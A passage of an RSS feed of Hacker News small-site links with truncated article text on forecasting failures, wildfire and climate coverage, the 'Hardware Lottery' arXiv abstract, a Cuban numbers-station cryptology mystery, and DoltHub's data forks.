of 50 such specialists and asked them to predict the interest rate 8 months into the future.</p><p>From a starting interest rate of 3.2%, the professional&nbsp;predictions ranged from a high of 3.8% to a low of 2.5%. The average estimate was 3.4%.</p><p>In reality, nobody came close. 6 months in and the interest rate had fallen below the predictions’ lower bound. And it kept falling. By the end of the prediction timeframe the rate was closing in on 2%. None of the predictions had come within half a percent of reality.&nbsp;</p><p>These may seem like fine margins, but half a percent represents about a sixth of the initial rate. That’s like having 50 estate agents estimating the value of a $1.2m property and nobody coming within $200,000.</p><p>And this isn’t a one off.</p><p>The Obstfeld and Tesar article&nbsp;presents the results of similar studies conducted in&nbsp;five different years.</p><p>In every single one, the&nbsp;forecasts fail. In 2006, the rate was predicted to be 6%, in reality it was closer to 5%. In 2010, it was predicted to be 6%, it was actually closer to 4%. In 2005, it was predicted to be 5%, it was closer to 2%.</p><p>The article concludes:</p><blockquote><p>“The decline (in interest rates) has come largely as a surprise. Financial markets and professional forecasters alike consistently failed to predict the secular shift, focusing too much on cyclical factors.”</p></blockquote><p>It seems that interest rate predictions are prone to flounder and fold. But that doesn’t stop us from making more. Despite our failures at forecasting one economy, some turn their attention to predicting the relationship between two. But how do they fare?&nbsp;</p><p>That’s the field that we’ll focus on next.</p><h3>We can’t predict exchange rates</h3><p>If predicting the ups and downs of one economy is hard, forecasting the relationship between two is doubly difficult.</p><p>Fortunately, financial institutions&nbsp;make an assessment of their success straight forward.</p><p>At the start of each year, many banks make a prediction for the end of year dollar-to-euro exchange-rate. In one study, Gerd Gigerenzer, the director emeritus of the Center for Adaptive Behavior and Cognition&nbsp;at the Max Planck Institute for Human Development, compiled the exchange rate predictions made between 2000 and 2010 by 22 international banks including Barclays, Citigroup, JPMorgan&nbsp;Chase, and the Bank of&nbsp;America Merrill Lynch.</p><p>Discussing the Gigerenzer study in his book&nbsp;<a href="https://www.amazon.co.uk/dp/1509843493/ref=cm_sw_r_cp_api_i_H6r5EbR6BYQMC"><span>Range</span></a>&nbsp;David Epstein provides some searing details into where the forecasts went wrong:</p><blockquote><p>“In six of the ten years, the true exchange rate fell outside the entire range of all twenty-two bank forecasts. (…) Major bank forecasts missed every single change of [exchange rate] direction in the decade Gigerenzer analysed.”</p></blockquote><p>Gigerenzer’s own conclusion was even more clear:</p><blockquote><p>“Forecasts of dollar-to-euro exchange rates are worthless.”</p></blockquote><p>30 years earlier, Richard Meese and Kenneth Rogoff, from the University of California, Berkeley and the Federal reserve respectively, pitted three different exchange rate …</p></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy">https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy</a></em></p>]]>
            </description>
            <link>https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy</link>
            <guid isPermaLink="false">hacker-news-small-sites-24522322</guid>
            <pubDate>Fri, 18 Sep 2020 22:03:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is Climate Change Responsible for This Season's Wildfires?]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24521994">thread link</a>) | @amoorthy
<br/>
September 18, 2020 | https://blog.thefactual.com/climate-change-wildfires-oregon-california | <a href="https://web.archive.org/web/*/https://blog.thefactual.com/climate-change-wildfires-oregon-california">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_151456960811572" data-hs-cos-general-type="widget" data-hs-cos-type="module">
    <div>
<div>
<div>
<div>


<div>
<div>


<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>The recent HBO miniseries <em>Chernobyl</em> captured a key moment in which human protagonists are confronted by the scale of a disaster. During this unprecedented man-made incident in 1986, nuclear scientists at a damaged nuclear reactor struggled to assess the danger from radiation, especially because the geiger counters on hand — devices meant to measure levels of radiation — <a href="https://www.jstor.org/stable/10.5612/slavicreview.74.1.104?read-now=1&amp;seq=9#page_scan_tab_contents" rel="noopener" target="_blank"><span>didn’t go high enough</span></a> to measure the amount of radiation leaking into the environment. The radiation essentially exceeded what the scientists had tools on hand to measure.</p>
<!--more-->
<p>This week, the fires across the West Coast highlighted our own inability to comprehend the scale of a disaster scenario, with air quality in parts of Oregon <a href="https://www.oregonlive.com/news/2020/09/portlands-air-quality-is-off-the-charts-on-sunday-and-much-of-oregon-is-just-as-bad-due-to-wildfires.html" rel="noopener" target="_blank"><span>exceeding</span></a> the Environmental Protection Agency’s 500-point AQI scale. Previously, events that put the AQI at 300 were “extremely rare”; in recent days, the AQI in places like Eugene, Oregon topped 700, essentially <a href="https://grist.org/climate/oregons-air-quality-is-so-far-beyond-hazardous-that-no-one-knows-what-it-means-for-health/" rel="noopener" target="_blank"><span>unfamiliar territory</span></a> in terms of air quality.&nbsp;</p>
<p>Though not quite the same as a nuclear meltdown, we are similarly unprepared to answer key questions about the crisis: What are the <a href="https://www.vox.com/21427857/california-wildfire-2020-oregon-washington-air-quality-smoke-orange-red-sky-health" rel="noopener" target="_blank"><span>health impacts</span></a> of exposure to this air? What are the long-term effects of fires in forest land that <a href="https://www.nytimes.com/2020/09/12/climate/oregon-wildfires.html?action=click&amp;module=Spotlight&amp;pgtype=Homepage" rel="noopener" target="_blank"><span>shouldn’t typically burn</span></a>? And above all, to what degree is human activity, via climate change or other mechanisms, responsible for such natural disasters?&nbsp;</p>
<p>This week, The Factual surveyed 29 articles from 23 news sources across the political spectrum to see how the media is talking about the West Coast’s mega-fire season, including views on how and to what degree human activity is responsible for seemingly apocalyptic scenarios.</p>
<h4><br><strong>A Wild Wildfire Season</strong></h4>
<p>Given the <a href="https://www.theguardian.com/us-news/2020/sep/12/california-oregon-washington-fires-explained-climate-change" rel="noopener" target="_blank"><span>unprecedented scope</span></a> of this year’s wildfires on the West Coast, a common question is why this wildfire season has been quite so bad. A cursory glance at headlines and comments by national figures would lead one to believe that there is a simple dichotomy, with the political left blaming climate change and the right blaming bad government policies. In reality, there seems to be some broad agreement on the key factors at play: (1) a problematic approach to forest management that has led to greater fire risks, (2) human behavior that makes fires more dangerous and more likely, and (3) a warming climate. Only when measuring to what degree changing climate is responsible, and the fundamental reasons for why climate is changing, does real disagreement emerge.</p>
<p>A big misconception about fires is that they are inherently dangerous and/or bad for the environment, but the reality is that they are an <a href="https://www.theguardian.com/us-news/2020/sep/12/california-oregon-washington-fires-explained-climate-change" rel="noopener" target="_blank"><span>essential part</span></a> of ecosystem renewal and healthy environmental progression. In a natural scenario, many forest habitats should burn on a regular basis, clearing the underbrush while leaving larger trees mostly unharmed. But a longtime misdirected approach to fire management on the West Coast has prioritized <a href="https://www.wired.com/story/climate-grief-is-burning-across-the-american-west/" rel="noopener" target="_blank"><span>putting out</span></a> fires quickly to protect growing human populations. However, this strategy has not been accompanied by enough controlled burns to limit growing fire risks and maintain normal ecosystem renewal.</p>
<p><span>"Part of the difficulty is that California’s climate provides only limited periods of time when crews can safely light fires to manage forest health. The conditions must be dry enough for vegetation to burn, but not dry enough to risk a runaway blaze." - <a href="https://www.sfchronicle.com/california-wildfires/article/Are-climate-change-or-poor-forest-management-15564031.php" rel="noopener" target="_blank">San Francisco Chronicle</a></span></p>
<p>While the safety rationale of the choice not to burn seems straightforward, it can perversely have the opposite effect. If an ecosystem does not burn, the underbrush continues to build up, making the next eventual fire <a href="https://www.nationalreview.com/2020/09/california-forest-mismanagement-a-disaster/#slide-1" rel="noopener" target="_blank"><span>hotter and more dangerous</span></a>. As the fire intensity increases, trees that shouldn’t burn go up in flames and smaller, low-intensity fires become fast-moving disasters that endanger natural ecosystems and human settlements alike. In this way, man-made policies have helped make the West Coast a tinderbox.</p>
<div><p>Further aggravating this risk is human behavior. As populations and urban areas grow, humans have expanded ever-outward, encroaching on and living in heavily-forested areas. This has increasingly placed populations in danger from wildfires. Forest management has been consistently <a href="https://www.nytimes.com/2020/09/10/climate/wildfires-climate-policy.html" rel="noopener" target="_blank"><span>under-resourced</span></a>, and landowners aren't always <a href="https://arstechnica.com/science/2020/01/why-isnt-california-using-more-prescribed-burns-to-reduce-fire-risk/" rel="noopener" target="_blank"><span>willing</span></a> to respond with the measures needed to mitigate fire risks. In California, for example, the state only owns <a href="https://www.kqed.org/science/1927354/controlled-burns-can-help-solve-californias-fire-problem-so-why-arent-there-more-of-them" rel="noopener" target="_blank">57% of forested land</a> and cannot obligate private landowners to use controlled burns to mitigate fire risks.</p></div>
<p><img src="https://lh5.googleusercontent.com/zxd_ypEby-bddzFmqsD5-961ZgOYuNCl08ZrzIsbA-JrHcczJEKfI32SXmpV7vj56YKlrEHixxzC0uvbbswH1LTdWmNQwimnRzsJOJ4hfe7DfOa_yc3LKRD03j6u1e1lJRmuA4_-" width="578"></p>
<div><p>The WUI, or wildland-urban interface, is the area where human settlement and wildlands intermix. These are areas were human structures are in close proximity to land prone to wildfires. Source: <a href="https://www.nrs.fs.fed.us/news/release/wui-increase" rel="noopener" target="_blank"><span>USDA</span></a></p></div>
<p>Factors such as lower housing costs and a desire to be closer to nature have <a href="https://www.nytimes.com/2020/09/10/climate/wildfires-climate-policy.html" rel="noopener" target="_blank"><span>helped encourage</span></a> the development subdivisions and individual homes well into the forest. To make matters worse, as these populations (and people from across the states) spend more time outdoors and in these forests, the risk of fire goes up. The ever-increasing levels of human activity is accompanied by an ever-higher risk of fire.</p>
<div><p>Finally, the overall climatic conditions cannot be ignored. 2020 promises to be one of the <a href="https://www.discovermagazine.com/environment/with-august-in-the-books-2020-is-still-likely-to-be-the-warmest-year-on" rel="noopener" target="_blank"><span>hottest years on record</span></a>, and this year’s fire season vigorously kicked off on a record-hot Labor Day weekend, partly because of a freak lightning storm in California (with over <a href="https://abcnews.go.com/ABCNews/million-acres-burned-california-firefighters-brace-lightning-storm/story?id=72551511" rel="noopener" target="_blank"><span>12,000 lightning strikes</span></a>) and partly because landscapes across the West Coast were uncharacteristically dry — even for fire season.&nbsp;</p></div>
<p><img src="https://lh6.googleusercontent.com/Sfqjx4sJ4aGT8ibajU93V7ZjH8HOQ8P0Th_NDP77MSdgLymRRRWv-8soEftHsKo7mmpODdIl2yHjPlGWaUWNnJLEop01ql63y_hzOWOwMZdCfJn6OW9a7tuveBEi7ECcAhyd0xhz" width="600"></p>
<div><p>This map shows how average temperatures in August 2020 contrast with the average August temperatures from 1951-1980.&nbsp; Source: <a href="https://www.discovermagazine.com/environment/with-august-in-the-books-2020-is-still-likely-to-be-the-warmest-year-on" rel="noopener" target="_blank"><span>Discover Magazine</span></a></p></div>
<p>It would seem that disputes about whether the world is warming have been replaced with a general agreement that, yes, things are getting hotter. This has obvious, straightforward effects for natural events like wildfires. Higher temperatures mean drier vegetation and potentially even more high-intensity <a href="https://www.oregonlive.com/news/2020/09/oregons-historic-wildfires-the-unprecedented-was-predictable.html" rel="noopener" target="_blank"><span>wind events</span></a>. That this is at least part of the reason for this fire season’s severity is clear to people on both sides of the spectrum.</p>
<p>Where these perspectives diverge is in terms of just who or what is responsible for changing climate. Though President Trump has used the occasion to <a href="https://www.washingtonexaminer.com/policy/energy/trump-says-world-will-start-getting-cooler-as-biden-criticizes-him-as-a-climate-arsonist" rel="noopener" target="_blank"><span>cast doubt</span></a> on the question of whether climate is changing — something almost all of the articles reviewed for this analysis roundly agree to be the case — the more pertinent divergence regards the degree to which human activity is responsible for the changing climate.&nbsp;</p>
<p>Articles from the political left and center are clear in the science and rationale for linking human activity, particularly the release of greenhouse gas emissions, with climate change — a phenomenon that represents a combination of not just overall warmer temperatures but also increasing weather extremes, rising sea levels, and shifting climatic patterns. In the case of wildfires, this means some articles lay proportionally more blame on <a href="https://www.latimes.com/california/story/2020-09-13/climate-change-wildfires-california-west-coast" rel="noopener" target="_blank"><span>larger climate trends</span></a>, blaming global <a href="https://www.wired.com/story/climate-grief-is-burning-across-the-american-west/" rel="noopener" target="_blank"><span>CO2 emissions</span></a> as much as localized factors like forestry management.&nbsp;</p>
<p>“Many of the phenomena happening now have been predicted for years by agencies like NASA, NOAA and the United Nations, as well as researchers and scientists around the world, who say the only chance of slowing climate change is cutting back or eliminating the biggest producers of greenhouse gases, including cars.” - <a href="https://weather.com/news/climate/news/2020-09-11-extreme-weather-climate-change-disasters-wildfires-flooding-hurricanes" rel="noopener" target="_blank"><span>The Weather Channel</span></a></p>
<p>Many on the political right are still hesitant to conclude that human activity is the driving force behind a changing climate, even if many acknowledge that the climate is <a href="https://www.foxnews.com/politics/wildfire-democrats-climate-change" rel="noopener" target="_blank"><span>getting warmer</span></a>. As a result, much more right-leaning coverage focuses on the direct, <a href="https://reason.com/2020/09/14/western-wildfires-can-be-prevented-if-burdens-on-forest-management-are-eased/" rel="noopener" target="_blank"><span>human reasons</span></a> for the current spate of fire disasters, and <a href="https://today.yougov.com/topics/science/articles-reports/2020/09/15/what-americans-think-about-wildfires-and-climate-c" rel="noopener" target="_blank"><span>roughly half</span></a> of Republicans may think that climate change has not played a role in the current fires.&nbsp;</p>
<p>Ideally, we could better isolate each variable to say how much human movement into forests is responsible for fires and how much is due to a warmer climate, but this is hard to parse from overall trends. For example, across the U.S. we built as many as <a href="https://www.mdpi.com/2571-6255/3/3/50/htm" rel="noopener" target="_blank"><span>32 million homes</span></a> between 1990 and 2015 in the wildland-urban interface — areas where the wildlands intermix with human development — many of which are at increased fire risk. At the same time, fires near Portland are burning forest that has historically been too wet to pose a significant hazard to long-standing neighborhoods.&nbsp;</p>
<p>“What’s different this time is that exceptionally dry conditions, combined with unusually strong and hot east winds, have caused wildfires to spiral out of control, threatening neighborhoods that didn’t seem vulnerable until now.” - <a href="https://www.nytimes.com/2020/09/12/climate/oregon-wildfires.html?action=click&amp;module=Spotlight&amp;pgtype=Homepage" rel="noopener" target="_blank"><span>New York Times</span></a></p>
<div><p>A positive perspective on the issue might note that both sides, despite clear and vocal differences, actually agree that human activity and behavior make up many of the key reasons for these apocalyptic conditions.</p></div>
<h4><strong>Moving Forward</strong></h4>
<p>As <a href="https://www.chicagotribune.com/weather/ct-weather-smoke-fires-gray-sky-20200914-kpmxe2i2gjhahocfpd7zwovqt4-story.html" rel="noopener" target="_blank"><span>smoke wafts</span></a> across the U.S., there may be greater impetus to drive higher-level reform to address these growing issues. There are many reforms that both sides can agree on. Above all, we need to <a href="https://www.nytimes.com/2020/09/10/climate/wildfires-climate-policy.html" rel="noopener" target="_blank"><span>modify land management practices</span></a> and divert more resources to both fire response and prevention. For example, as the risk of fire has increased, funding that should be used for fire prevention has been shifted to firefighting. Cumbersome regulatory hurdles have slowed the implementation of controlled burns, and private landowners <a href="https://www.foxnews.com/politics/wildfire-democrats-climate-change" rel="noopener" target="_blank"><span>can still reject</span></a> such preventative action, often fearful of <a href="http://sacbee.com/news/california/article239475468.html" rel="noopener" target="_blank"><span>liability</span></a>. Measures like <a href="https://slate.com/business/2018/11/california-houses-rebuild-camp-fire-design.html" rel="noopener" target="_blank"><span>increasingly fire-proof</span></a> homes can help, but only go so far.</p>
<p>“Forest Service spending on fire suppression in recent years has gone from 15 percent of the budget to 55 percent – or maybe even more – which means we have to keep borrowing from funds that are intended for forest management.” - <a href="https://www.usda.gov/media/press-releases/2017/09/14/forest-service-wildland-fire-suppression-costs-exceed-2-billion" rel="noopener" target="_blank"><span>Secretary of Agriculture Sonny Purdue</span></a></p>
<p>Below this common ground, larger disagreements promise to persist, especially about climate change and its role in the current conflagrations. A host of policy actions that the political left targets, such as reducing …</p></span></p></div></div></div></div></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.thefactual.com/climate-change-wildfires-oregon-california">https://blog.thefactual.com/climate-change-wildfires-oregon-california</a></em></p>]]>
            </description>
            <link>https://blog.thefactual.com/climate-change-wildfires-oregon-california</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521994</guid>
            <pubDate>Fri, 18 Sep 2020 21:21:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Hardware Lottery]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24521983">thread link</a>) | @bnjemian
<br/>
September 18, 2020 | Https://arxiv.org/abs/2009.06489 | <a href="https://web.archive.org/web/*/Https://arxiv.org/abs/2009.06489">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      
      <div id="content">
        <!--
rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
         xmlns:dc="http://purl.org/dc/elements/1.1/"
         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
    <rdf:Description
        rdf:about="/abs/2009.06489"
        dc:identifier="/abs/2009.06489"
        dc:title="The Hardware Lottery"
        trackback:ping="/trackback/2009.06489" />
    </rdf:RDF>
-->
<div id="abs-outer">
  

  <div>
    

    <p><strong>arXiv:2009.06489</strong> (cs)
    </p>
    



<div id="content-inner">
  <div id="abs">
    <p>
  
  
  
    
  
  
    
    
  

  [Submitted on 14 Sep 2020]</p>
    
    
      
    
  
    <p><a href="https://arxiv.org/pdf/2009.06489">Download PDF</a></p><blockquote>
      <span>Abstract:</span>  Hardware, systems and algorithms research communities have historically had
different incentive structures and fluctuating motivation to engage with each
other explicitly. This historical treatment is odd given that hardware and
software have frequently determined which research ideas succeed (and fail).
This essay introduces the term hardware lottery to describe when a research
idea wins because it is suited to the available software and hardware and not
because the idea is superior to alternative research directions. Examples from
early computer science history illustrate how hardware lotteries can delay
research progress by casting successful ideas as failures. These lessons are
particularly salient given the advent of domain specialized hardware which
makes it increasingly costly to stray off of the beaten path of research ideas.

    </blockquote>

    <!--CONTEXT-->
    <div>
      <table summary="Additional metadata"><tbody><tr>
          <td>Subjects:</td>
          <td>
            <span>Computers and Society (cs.CY)</span>; Artificial Intelligence (cs.AI); Hardware Architecture (cs.AR); Machine Learning (cs.LG)</td>
        </tr><tr>
          <td>Cite as:</td>
          <td><span><a href="https://arxiv.org/abs/2009.06489">arXiv:2009.06489</a> [cs.CY]</span></td>
        </tr>
        <tr>
          <td>&nbsp;</td>
          <td>(or <span>
              <a href="https://arxiv.org/abs/2009.06489v1">arXiv:2009.06489v1</a> [cs.CY]</span> for this version)
          </td>
        </tr>
      </tbody></table>
    </div>
  </div>
</div>

    <div>
      <h2>Submission history</h2><p> From: Sara Hooker [<a href="https://arxiv.org/show-email/37378193/2009.06489">view email</a>]
      <br><strong>[v1]</strong>
Mon, 14 Sep 2020 14:49:10 UTC (4,498 KB)<br></p></div>
  </div>
  <!--end leftcolumn-->

  <div>
    
    <!--end full-text-->
    <div><p>
    Current browse context: </p><p>cs.CY</p>

  
  
    </div>

    

    
  </div>
  <!--end extra-services-->


  
  
  
  

  
</div>

      </div>
    </div></div>]]>
            </description>
            <link>Https://arxiv.org/abs/2009.06489</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521983</guid>
            <pubDate>Fri, 18 Sep 2020 21:20:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Cryptologic Mystery]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24521801">thread link</a>) | @homarp
<br/>
September 18, 2020 | https://www.mattblaze.org/blog/neinnines/ | <a href="https://web.archive.org/web/*/https://www.mattblaze.org/blog/neinnines/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="center"><div>
		<p>18 September 2020</p><p>A Cryptologic Mystery</p>
	<p>Did a broken random number generator in Cuba help expose a Russian espionage network?</p>




	
<p>
I picked up the new book <em>Compromised</em> last week and was intrigued to discover that it may have shed some light on a small (and rather esoteric) cryptologic and espionage mystery that I've been puzzling over for about 15 years. <em>Compromised</em> is primarily a memoir of former FBI counterintelligence agent Peter Strzok's investigation into Russian operations in the lead up to the 2016 presidential election, but this post is not a review of the book or concerned with that aspect of it.
</p><p>
Early in the book, as an almost throwaway bit of background color, Strzok discusses his work in Boston investigating the famous Russian "illegals" espionage network from 2000 until their arrest (and subsequent exchange with Russia) in 2010. "Illegals" are foreign agents operating abroad under false identities and without official or diplomatic cover. In this case, ten Russian illegals were living and working in the US under false Canadian and American identities. (The case inspired the recent TV series <em>The Americans</em>.)
</p><p>
Strzok was the case agent responsible for two of the suspects, Andrey Bezrukov and Elena Vavilova (posing as a Canadian couple under the aliases Donald Heathfield and Tracey Lee Ann Foley). The author recounts watching from the street on Thursday evenings as Vavilova received encrypted shortwave "numbers" transmissions in their Cambridge, MA apartment.
</p><p>
Given that Bezrukov and Vaviloa were indeed, as the FBI suspected, Russian spies, it's not surprising that they were sent messages from headquarters using this method; numbers stations are part of time-honored espionage tradecraft for communicating with covert agents. But their capture may have illustrated how subtle errors can cause these systems to fail badly in practice, even when the cryptography itself is sound.
<br>
<a name="fold">&nbsp;</a></p><hr size="1"><p>
	

First, a bit of background. For at least the last sixty years, encrypted shortwave radio transmissions have been a standard method for sending messages to covert spies abroad. Shortwave radio has several attractive properties here. It covers long distances; it's possible for a single transmitter to get hemispheric or even global coverage. Shortwave radio receivers, while less common than they once were, are readily available commercially in almost every country and are not usually suspicious or alerting to possess. And while it's relatively easy to tell where a shortwave signal is coming from, their wide coverage area makes it very difficult to infer exactly who or where the intended recipients might be. Both the US (and its allies) and the Soviet Union (and its satellites) made extensive use of shortwave radio for communicating with spies during the cold war, and enigmatic "numbers" transmissions aimed at spies continue to this day.
</p><p>
The encryption method of choice used by numbers stations is called a "one time pad" (OTP) cipher. OTPs have unique advantages over other encryption methods. Used properly, they are <em>unconditionally</em> secure; no amount of computing power or ingenuity can "break" them without knowledge of the secret key. Also, they are almost deceptively low tech. It is possible to encrypt and decrypt OTP messages by hand with nothing more than paper and pencil and simple arithmetic. The disadvantage is that OTPs are cumbersome; you need a secret key as long as all the messages you will ever send, with no part of the key ever re-used for multiple messages. Typically, the key would be printed as a series of digits bound into a pad of paper, with each page removed after use; hence the name "one time pad". OTPs can be difficult in practice to use properly and are quite vulnerable if used improperly; more on that later.
</p><p>
The OTP messages sent to spies by shortwave radio typically consist of decimal digits broadcast in either a mechanically recorded voice or in morse code (more recently, digital transmissions are also used) on designated frequencies at designated times, usually in four or five digit groups (hence the term "numbers station"). After copying and verifying a header in the message, the agent would remove the corresponding page from their secret OTP codebook and add each key digit to each corresponding message digit using modulo-10 arithmetic (without carry). The resulting "plaintext" digits are then converted to text with a simple substitution encoding (e.g, A=01, B=02, etc., although other encodings are generally used). That's all there is to it. The security of the system depends entirely on the uniqueness and secrecy of the OTP codebook pad given to each agent.
</p><p>
To prevent "traffic analysis" that might reveal to an observer the number of active agents or the volume of messages sent to them, numbers stations typically operate on rigidly fixed schedules, sending messages at pre-determined times whether there is actually a message to be sent or not. When there is no traffic for a given timeslot, random dummy "fill" traffic is sent instead. The fill traffic should be indistinguishable to an outsider from real messages, thereby leaking nothing about how often or when the true messages are being sent. But more on this later.
</p><p>
None of this is by itself news. The existence of numbers stations has been publicly known (and tracked by hobbyists) since at least the 1960's, and OTPs are an elementary cryptographic technique known to every cryptographer. However, Strzok mentions two interesting details I'd not seen published previously and that may solve a mystery about one of the most well known numbers stations heard in North America.
</p><p>
First, <em>Compromised</em> reveals that the FBI found that during at least some of the time the illegals were under investigation, the Russian numbers intended for them were sent not by a transmitter in Russia (which might have difficulty being reliably received in the US), but relayed by the <em>Cuban</em> shortwave numbers station. This is perhaps a bit surprising, since the period in question (2000-2010) was well after the Soviet Union, the historic protector of Cuba's government, had ceased to exist.
</p><p>
The Cuban numbers station is somewhat legendary. It is a powerful station, operated by Cuba's intelligence directorate but co-located with Radio Habana's transmitters near Bauta, Cuba, and is easily received with even very modest equipment throughout the US. While its numbers transmissions have taken a variety of forms over the years, during the early 2000's it operated around the clock, transmitting in both voice and morse code. The station was (and remains) so powerful and widely heard that radio hobbyists quickly derived its hourly schedule. During this period, each scheduled hourly transmission consisted of a preamble followed by three messages, each made up entirely of a series of five digit groups (with by a brief period of silence separating the three messages). The three hourly messages would take a total of about 45 minutes, in either voice or morse code depending on the scheduled time and frequency. Every hour, the same thing, predictably right on schedule (with fill traffic presumably substituted for the slots during which there was no actual message).
</p><p>
If you want to hear what this sounded like, here's a recording I made on October 4, 2008 of one of the hourly voice transmissions, as received (static and all) in my Philadelphia apartment: <a target="_blank" href="https://www.mattblaze.org/private/17435khz-200810041700.mp3"><tt>www.mattblaze.org/private/17435khz-200810041700.mp3</tt></a>. The transmission follows the standard Cuban numbers format of the time, starting with an "Atenćion" preamble listing three five-digit identifiers for the three messages that follow, and ending with "Final, Final". In this recording, the first of the three messages (64202) starts at 3:00, the second (65852) at 16:00, and the third (86321) at 29:00, with the "Final" signoff at the end. The transmissions are, to my cryptographic ear at least, both profoundly dull and yet also eerily riveting. 
</p><p>
And this is where the mystery I've been wondering about comes in. In 2007, I noticed an odd anomaly: some messages completely lacked the digit 9 ("nueve"). Most messages had, as they always did and as you'd expect with OTP ciphertext, a uniform distribution of the digits 0-9. But other messages, at random times, suddenly had no 9s at all. I wasn't the only (or the first) person to notice this; apparently the 9s started disappearing from messages some time around 2005.
</p><p>
This is, to say the least, very odd. The way OTPs work should produce a uniform distribution of all ten digits in the ciphertext. The odds of an entire message lacking 9s (or any other digit) are infinitesimal. And yet such messages were plainly being transmitted, and fairly often at that. In fact, in the recording of the 2008 transmission linked to above, you will notice that while the second and third messages use all ten digits, the first is completely devoid of 9s.
</p><p>
I remember concluding that the most likely, if still rather improbable, explanation was that the 9-less messages were dummy fill traffic and that the random number generator used to create the messages had a bug or developed a defect that prevented 9s from being included. This would be, to say the least, a very serious error, since it would allow a listener to easily distinguish fill traffic from real traffic, completely negating the benefit of having fill traffic in the first place. It would open the door to exactly the kind of traffic analysis that the system was carefully engineered to thwart. The 9-less messages went on for almost ten years. (If I were reporting this as an Internet vulnerability, I would dub it the "Nein Nines" attack; please forgive the linguistic muddle). But I was resigned to the likelihood that I would never know for sure.
</p><p>
And this brings us to the second observation from Strzok's book.
</p><p>
<em>Compromised</em> doesn't say anything about missing nueves, but he does mention that the FBI exploited a serious tradecraft error on the part of the sender: the FBI was able …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mattblaze.org/blog/neinnines/">https://www.mattblaze.org/blog/neinnines/</a></em></p>]]>
            </description>
            <link>https://www.mattblaze.org/blog/neinnines/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521801</guid>
            <pubDate>Fri, 18 Sep 2020 20:55:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dolt releases forks to become a real open data collaboration platform]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24521536">thread link</a>) | @bheni
<br/>
September 18, 2020 | https://www.dolthub.com/blog/2020-09-18-introducing-forks/ | <a href="https://web.archive.org/web/*/https://www.dolthub.com/blog/2020-09-18-introducing-forks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text"><p>Today, <a href="https://dolthub.com/">DoltHub</a> released forks. It is the same system that Github uses for collaboration on over
100 million repositories contributed to by their 40+ million users.  For the first time there is a general platform
for data collaboration, and we hope it moves open data to the next level.</p>

<p>When we started this company in August 2018 something that excited us was expanding the types of businesses that you
could start, and succeed at.  In many of the spaces today, it is difficult to come in and compete with the large players
simply because they have huge amounts of data that isn't available publicly.</p>
<p>As an example, Google launched "Google Maps" in 2005 and has heavily invested in that space since then.  It had offered
an API freely until 2012 when it began charging.  If you want to come in and compete with Google Maps you will need data
that is at least as good or better than Google's.  You can pay Google for access to their data, but at that point
you are paying to make their data better, and the gap between the data that you have, and the data that they have widens.  You
could spend the money to acquire that data, but the cost of acquiring it is beyond the budget of any startup.
So the only way to compete is with the help of others. <a href="https://www.openstreetmap.org/#map=5/38.007/-95.844">Open Street Maps</a>
is an open data project with hundreds of contributors which is being used and contributed to by companies such as Apple, Faceebook,
Foursquare, Mapbox, MapQuest, Tesla, Wikipedia and Snapchat.</p>
<p>Projects such as <a href="https://wikipedia.com/">Wikipedia</a>, other <a href="https://wikimedia.org/">Wikimedia projects</a>, and
<a href="https://www.openstreetmap.org/#map=5/38.007/-95.844">Open Street Maps</a> have shown the power of community collaboration
on data. However, there hasn't ever been a platform that made collaborating on data feasible.</p>

<p>As obvious as the benefits of data collaboration are, there are very few successful collaborative data projects.  The ones
that have been successful created platforms for getting data mainlined using specialized processes for
editing, merging, and handling conflicts that are specific to their data. </p>
<p>Though not a data product, I'll also be looking at how Git/Github approached these problems in order to
become the largest collaborative coding platform in the world, and how this approach can be used to provide a general
purpose collaborative data platform, and how Dolt/Dolthub extend that to data.</p>
<h2>Merging and Conflicts</h2>
<p>Any time you have multiple editors working on something together, merging and conflicts are a problem.  Whether it's
people collaboratively editing a document online, working on source code managed by some version control system, or
editing data in a database there is always the potential for two or more users to be modifying the same data.</p>
<p>There are different strategies for dealing with this employed by different systems. A simple solution is to just allow
the last write to win.  Some systems might force manual merges, while others may have complex domain-specific rules for
completely automated merges.  Git and Dolt attempt to automatically merge multiple edits into one, and force manual
resolution when item cannot be merged without conflict. Dolt takes it a step further by allowing you to analyze
the differences, and conflicts via SQL, and then lets you write SQL to resolve them.  </p>
<h2>Data Quality and Trust</h2>
<p>Any time you are working on a project that is open to the world, you will have to deal with bad actors.  <a href="https://www.calvertjournal.com/articles/show/2967/wikipedia-russian-government-edits">Some have
bad intentions</a>, others
are <a href="https://www.boredpanda.com/funny-wikipedia-edits/">just having a laugh</a>, and others may be adding incorrect
data unintentionally.</p>
